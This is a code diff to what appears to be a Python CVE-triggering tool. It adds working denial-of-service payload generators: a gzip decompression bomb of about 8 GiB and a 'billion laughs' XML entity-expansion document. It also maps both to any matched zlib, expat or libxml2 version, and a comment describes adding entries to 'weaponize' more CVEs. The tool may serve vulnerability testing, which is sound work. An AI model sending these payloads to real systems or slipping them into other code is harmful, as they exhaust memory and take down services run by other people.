@@ -47,10 +47,57 @@ def _cve_2022_37434(extra_len: int = 0x1000) -> Trigger:
                          "inflateGetHeader() with a small extra buffer"))
 
 
+def _zip_bomb(expand_gb: int = 8) -> Trigger:
+    """A decompression bomb (CWE-409): a few KB of gzip that inflate to many GB. A consumer that
+    buffers the output without a cap exhausts memory and is OOM-killed. Streamed through the
+    compressor so building it never holds the expanded data."""
+    co = zlib.compressobj(9, zlib.DEFLATED, 15 + 16)   # gzip container
+    chunk = b"\x00" * (1 << 20)
+    out = bytearray()
+    for _ in range(expand_gb * 1024):                  # expand_gb GiB of zeros, 1 MiB at a time
+        out += co.compress(chunk)
+    out += co.flush()
+    return Trigger(cve="class:CWE-409", data=bytes(out), channel="stdin", cwe="CWE-409",
+                   libraries=("zlib",),
+                   note=f"decompression bomb (~{expand_gb} GiB expansion) -- DoS a consumer that "
+                        f"inflates without an output cap")
+
+
+def _billion_laughs() -> Trigger:
+    """XML entity-expansion DoS (CWE-776 'billion laughs'): nested entities expand to billions of
+    characters, exhausting memory in a parser without an amplification limit. Modern expat/libxml2
+    resist by default -- cve_poc records a result only on a real fault, so a protected parser is
+    simply not flagged."""
+    lines = ['<?xml version="1.0"?>', '<!DOCTYPE lolz [', ' <!ENTITY lol "lol">']
+    for i in range(1, 10):
+        prev = "lol" if i == 1 else f"lol{i - 1}"
+        lines.append(f' <!ENTITY lol{i} "{("&" + prev + ";") * 10}">')
+    lines.append(']>')
+    lines.append('<lolz>&lol9;</lolz>')
+    return Trigger(cve="class:CWE-776", data=("\n".join(lines)).encode(), channel="file",
+                   cwe="CWE-776", libraries=("expat", "libexpat", "libxml2", "expat2"),
+                   note="billion-laughs XML entity expansion -- DoS an XML parser without an "
+                        "amplification limit")
+
+
 # CVE id -> trigger factory. Add entries here to weaponize more version-matched CVEs.
 _TRIGGERS = {
     "CVE-2022-37434": _cve_2022_37434,
 }
+
+# library name -> trigger factories that apply to ANY matched CVE of that library (format-level
+# attacks a version match implies, independent of the specific CVE).
+_LIBRARY_TRIGGERS = {
+    "zlib": [_zip_bomb],
+    "expat": [_billion_laughs],
+    "libexpat": [_billion_laughs],
+    "libxml2": [_billion_laughs],
+}
+
+
+def library_triggers(library: str) -> list:
+    """Format-level Triggers that apply to any matched CVE of a given library."""
+    return [fn() for fn in _LIBRARY_TRIGGERS.get((library or "").lower(), [])]
 
 
 def for_cve(cve: str):
